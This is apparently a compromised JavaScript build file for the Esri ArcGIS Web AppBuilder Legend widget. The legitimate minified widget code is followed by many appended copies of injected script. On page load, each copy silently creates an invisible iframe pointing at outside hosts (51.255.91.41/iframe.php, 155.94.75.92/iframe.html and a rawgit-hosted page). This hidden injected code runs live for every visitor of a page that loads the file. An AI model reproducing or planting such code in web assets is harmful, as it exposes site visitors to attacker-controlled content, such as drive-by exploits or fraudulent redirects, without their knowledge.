// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"widgets/Legend/Utils":function(){define(["dojo/_base/array","jimu/LayerInfos/LayerInfos"],function(c,d){var g=function(b){var e=[];b=d.getInstanceSync().getLayerInfoArray();c.forEach(b,function(a){var b=[];a.getShowLegendOfWebmap()&&(!a.layerObject||"esri.layers.ArcGISDynamicMapServiceLayer"!==a.layerObject.declaredClass&&"esri.layers.ArcGISTiledMapServiceLayer"!==a.layerObject.declaredClass||c.forEach(a.layerObject.dynamicLayerInfos||a.layerObject.layerInfos,function(f){var c=null;
a.traversal(function(a){if(a.subId===f.id)return a.isLeaf()&&!a.getShowLegendOfWebmap()&&b.push(a.originOperLayer.mapService.subId),c=a,!0});c||b.push(f.id)}),a.isMapNotesLayerInfo()?c.forEach(a.getSubLayers(),function(a){a.getShowLegendOfWebmap()&&e.push({layer:a.layerObject,title:"Map Notes - "+a.title})}):e.push({hideLayers:b,layer:a.layerObject,title:a.title}))});return e.reverse()};return{getLayerInfosParam:function(b){return g(b)}}})},"widgets/Legend/_build-generate_module":function(){define(["dojo/text!./Widget.html",
"dojo/text!./css/style.css","dojo/i18n!./nls/strings"],function(){})},"url:widgets/Legend/Widget.html":'\x3cdiv\x3e\r\n  \x3c!--div data-dojo-attach-point\x3d"legendDiv"\x3e\x3c/div--\x3e\r\n  \x3cdiv style\x3d"display:none" data-dojo-attach-point\x3d"removedDiv"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n\r\n\r\n',"url:widgets/Legend/css/style.css":".esriLegendServiceLabel {font-size: 14px;}.esriLegendLayer{font-size: 12px;}","*now":function(c){c(['dojo/i18n!*preload*widgets/Legend/nls/Widget*["ar","bs","cs","da","de","en","el","es","et","fi","fr","he","hi","hr","id","it","ja","ko","lt","lv","nb","nl","pl","pt-br","pt-pt","ro","ru","sl","sr","sv","th","tr","zh-cn","vi","zh-hk","zh-tw","ROOT"]'])},
"*noref":1}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on ./Utils dijit/_WidgetsInTemplateMixin jimu/BaseWidget jimu/LayerInfos/LayerInfos esri/dijit/Legend".split(" "),function(c,d,g,b,e,a,h,f,k){return c([h,a],{name:"Legend",baseClass:"jimu-widget-legend",legend:null,_jimuLayerInfos:null,startup:function(){this.inherited(arguments)},onOpen:function(){this.config.layerState||(this.config.layerState={});this._jimuLayerInfos=f.getInstanceSync();var a={arrangement:this.config.legend.arrangement,autoUpdate:this.config.legend.autoUpdate,
respectCurrentMapScale:this.config.legend.respectCurrentMapScale,map:this.map,layerInfos:this._getLayerInfosParam()};this.legend=new k(a,g.create("div",{},this.domNode));this.legend.startup();this._bindEvent()},onClose:function(){this.legend.destroy()},_bindEvent:function(){this.config.legend.autoUpdate&&(this.own(b(this._jimuLayerInfos,"layerInfosIsShowInMapChanged",d.hitch(this,"refreshLegend"))),this.own(b(this._jimuLayerInfos,"layerInfosChanged",d.hitch(this,"refreshLegend"))),this.own(b(this._jimuLayerInfos,
"layerInfosRendererChanged",d.hitch(this,"refreshLegend"))))},_getLayerInfosParam:function(){return e.getLayerInfosParam(this.config)},refreshLegend:function(){var a=this._getLayerInfosParam();this.legend.refresh(a)}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});